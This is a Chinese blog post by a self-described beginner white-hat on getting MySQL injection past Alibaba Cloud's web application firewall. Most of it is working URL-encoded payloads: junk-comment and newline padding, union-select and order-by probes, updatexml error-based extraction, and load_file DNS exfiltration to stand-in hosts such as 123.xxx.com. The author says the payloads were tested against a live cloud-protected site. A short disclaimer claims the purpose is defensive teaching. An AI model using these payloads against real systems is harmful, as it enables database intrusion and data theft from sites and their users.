<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0gjgPz2QfNC0Y6_AL6JV_Q)

![](https://mmbiz.qpic.cn/mmbiz_jpg/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9ibfCXXnmOAs381QKAqicKe5gpLRC1Qk1sQvOzP5RjgKusxc0nBer5vLQ/640?wx_fmt=jpeg)  

一位苦于信息安全的萌新小白帽

本实验仅用于信息防御教学，切勿用于它用途

公众号：XG 小刚

mysql 数据库

mysql 的一些小技巧

```
WHERE id= '2.0abc' 转为数字时变成2
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9Ryj8ntA2rVFZrYCo6Rffjrz7L8rqfeV1Hd5NrZrmC4h060CQXhmSxQ/640?wx_fmt=png)

url 传入 ascii 大于 80 时进行 \ x80 编码

```
http://127.0.0.1/sql/Less-38/index.php?id=%80%81%82
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd98NTHLjCdA10jwGVGuPwvw5G5QS4s3IQ9ImUpVFnwGWHFHYfgiawaPtQ/640?wx_fmt=png)

  
函数与括号之间可添加空格、换行、注释

```
select user (),database/**/(),version
#123
() from users;
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9rPsP4icGciaONQ7DsXuDZpQHFVqTWnIicANHJeOkRbQ41U9xZEjcd8iaiaQ/640?wx_fmt=png)

执行语句之间的空格，可用 "/**/"、"换行 %0a" 替换

```
SELECT * FROM
users WHERE id= '3.0abc'-1/**/union/**/select
'3.0abc',2,3
from
users;
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9AJuXEicDYMw1qXicdx0x7jAznThHDicH62yxbucHncOElz0GheHwIHlYg/640?wx_fmt=png)

```
注释符：--，#，/**/
#单行注释后面所有内容，换行后注释失效
--和#号一样，但是后边必须有个空格，没空格则视为两个减号
/*aaa*/可用多行注释
注释内容在sql语句中解析为空格
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9AJFs2c9wbZibjO26aMiakjSleJo61SG5SkxMjo0ecw0vFQchWFvtkJgw/640?wx_fmt=png)

逻辑判断式 1>1、'a'='b'，from 后的表格名，select 语句，可用括号包裹

```
SELECT * FROM (users) WHERE (id='3.0abc') union (select '3.0abc',2,user() from (users));
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9ic41MSiafNWw3caDhdwa4MuuHjo1x8J0U3ITZibk1MKxrVytt4IsgEZIA/640?wx_fmt=png)

单双引号'"、括号 ()、反单引号 ``、星号 *、与语句之间可以没有空格

```
SELECT*FROM(users)WHERE(id='3.0abc')union(select'3.0abc',2,user()from`users`);
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9u40ibUUuUmuUn7WO6pyobGibh7pQos3sEI9n8xt9dTcia5CnPeQiaIePzg/640?wx_fmt=png)

就列举几个啊，其他什么内联注释什么的基本不能用了。

构造绕过语句

绕 waf 无非就是构造语句，突破防 sql 的正则表达式  

根据上面规则可以构造一些垃圾字符，插入语句中并能正常运行。

常用就是注释配合换行符，然后在注释部分插入不可解析的 ascii 码  

```
--%20/*%99%0a
--%20%0d%0a%23/*%99%0a
%23/*%99%0a
```

找个阿里云的站，有没有注入点无所谓，只要阿里云没拦截，本地用 mysql 执行一下看看成功运行即可。

```
?id=1%27%20or%20%271
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9CnIfK61bR00Ly0QxHVDBz4AAicw9WibGjt8uWecGTic0ib6Xf10iauib3cGw/640?wx_fmt=png)  

看上面逻辑判断直接拦截啊，删除 or 前后空格

```
?id=1%27or%271           #字符型注入
?id=1%20or%201           #数字型注入
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9LGUfZC9Via7UOQowzXz8xq4ibtnsptUSWdVWibgibxu8lNzs17sicupwjLw/640?wx_fmt=png)

沒拦截，看看本地能运行不

这里我本地搭建的 sqli 环境

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd99cggaeR1clNlkkl8kCniavWUGINgvzRpzoX8TUYWVge8DL1QGDKRsIw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9Ix3hE9Gw6GPB3myk3opCIChq86bIdricSVB9fIW9Qic24qTW8w0x8LLw/640?wx_fmt=png)

成功运行啊，后面简单说说其他常规语句的绕过

order by 1

order by 常用于判断列表数

```
?id=1%27order%20by%20id%23
?id=1%27order%23/*%99%0aby%23/*%99%0a4%23
?id=1%20order%23/*%99%0aby%23/*%99%0aid%23
?id=1%20order%23/*%99%0aby%23/*%99%0a4%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9MA581nNSJHFSz8rRibMBpibsh69oUjUmKfIGia25hTGU3bd0CEGicPQwnA/640?wx_fmt=png)

union select x from x

联合注入

```
?id=union%23/*%99%0aselect
?id=union--%20%0d%0a%23/*%99%0aselect
?id=union--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0aa,2,asd
?id=union--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0a1,id,3%20from%20users
?id=1%27union--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0a1,id,3%20from%20users%23%27
?id=1%20union--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0a1,id,3%20from%20users%23
?id=1%27union--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0a1,%23/*%99%0auser(),3%20from%20users%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9LHQtyiaEiaD79SBoI9icjWhG6eS67l1nJg8jvDYJMibyPaz7icH6Ox3kaBg/640?wx_fmt=png)

load_file()

dns 外带查询, 阿里云拦截率 dnslog，所以使用别的网站

```
?id=1%27union--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0aload_file(%22//123.xxx.com/abc%22)%23
?id=1%27%26%26(--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0aload_file(%22//123.xxx.cn/abc%22))%23
?id=1%27%26%26(--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0aload_file(%23/./%23/*%99%0a))%23
```

```
?id=concat(%27//%27,(select%23/*%99%0a123),%22.123.test.com/abc%22)
```

```
?id=1%27%26%26(--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0aload_file(%23/./%23/*%99%0d%0aconcat(%27//%27,(%23%0aselect%23/*%99%0a111),%27.123.text.com/abc%27)))%23
?id=1%20%26%26(--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0aload_file(%23/./%23/*%99%0d%0aconcat(%27//%27,(%23%0aselect%23/*%99%0a111),%27.123.text.com/abc%27)))%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9HVyI5vyTsKOkKDQTaJJR4z2rJhrXvthGWJHicbukITnia4FjDMG4TSGg/640?wx_fmt=png)

updatexml()

报错注入, 其他报错函数绕过方式应该差不多

```
?id=updatexml%23/*%99%0a(1,1,1)
?id=1%27and%20updatexml%23/*%99%0a(1,1,1)%23%27
?id=1%20and%20updatexml%23/*%99%0a(1,1,1)
```

```
?id=updatexml%23/*%99%0d%0a(0,(%23/*%99%0d%0aselect%0aa),%27a)%27)
?id=1%27%26%26updatexml%23/*%99%0d%0a(0,(%23%0aselect%23/*%99%0a111),%27a)%27)%23
?id=1%20and%20updatexml%23/*%99%0d%0a(0,(%23%0aselect%23/*%99%0a111),%27a)%27)%23
```

```
concat%0a%23concat)%0d%0a(%27//~%27,(select%23/*%99%0a123),0x7e)
```

```
?id=1%27%26%26updatexml%23/*%99%0d%0a(0,concat%0a%23concat)%0d%0a(%27//~%27,(select%23/*%99%0a123),0x7e),%27a)%27)%23
?id=1%20and%20updatexml%23/*%99%0d%0a(0,concat%0a%23concat)%0d%0a(%27//~%27,(select%23/*%99%0a123),0x7e),%27a)%27)%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9M1CadXtZNzTXehOb1p4sVy5PiaX3u3lg2jOjwnEHjTjia2KmZrPAeZsQ/640?wx_fmt=png)

其他

上面语句有的部分能过阿里云，但是一改参数名，就不行了  

比如参数 id 可以过

```
?id=1%20and%20updatexml%23/*%99%0d%0a(0,concat%0a%23concat)%0d%0a(%27//~%27,(select%23/*%99%0a123),0x7e),%27a)%27)%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9olVlibjLazsbGZODBYF0pfMiaKx8qdPTb0kricfUaZ2pXfFgicpO9IaVXg/640?wx_fmt=png)

参数改为 title 等其他的就不行了

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9WYjiblGJwh2W4kfialxcib3GrHicpU9d872yic9bWUhvBtKvmSn2XMFWgkA/640?wx_fmt=png)

在已经构造好上面语句的基础上

这里只要改改 and 或者 or 为 &&(%26%26) 和 ||() 的 url 编码，删除或添加空格 %20 有可能绕过

上面语句 and 改为 &&，删除前后空格即可绕过

```
?title=1%26%26updatexml%23/*%99%0d%0a(0,concat%0a%23concat)%0d%0a(%27//~%27,(select%23/*%99%0a123),0x7e),%27a)%27)%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9o9ARgAwhqzQnt3akEI3R4c90LJTic9c62YTyaJauFkqhu1ObicyTLia3g/640?wx_fmt=png)

再举个例子，参数改为 title 被拦截了

```
?title=1%27%26%26(--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0aload_file(%23/./%23/*%99%0d%0aconcat(%27//%27,(%23%0aselect%23/*%99%0a111),%27.123.text.com/abc%27)))%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9RQbomynFq7Xd9mhMico5UBOlyz6Tv61pv2Vyqpic3bkVNNUwKPCfTFYw/640?wx_fmt=png)

在数字 1 前面添加个空格 %20 就绕过了

```
?title=%201%27%26%26(--%20%0d%0a%23/*%99%0aselect--%20%0d%0a%23/*%99%0aload_file(%23/./%23/*%99%0d%0aconcat(%27//%27,(%23%0aselect%23/*%99%0a111),%27.123.text.com/abc%27)))%23
```

![](https://mmbiz.qpic.cn/mmbiz_png/zbTIZGJWWSOqoNfVchfrXnoEGnZJvfd9xQfpZfAuQD50mVgCxeoaiafkxTqiasd2tXiaR1yp6UHIYH5E8AydhTy3w/640?wx_fmt=png)

很离谱，很玄学。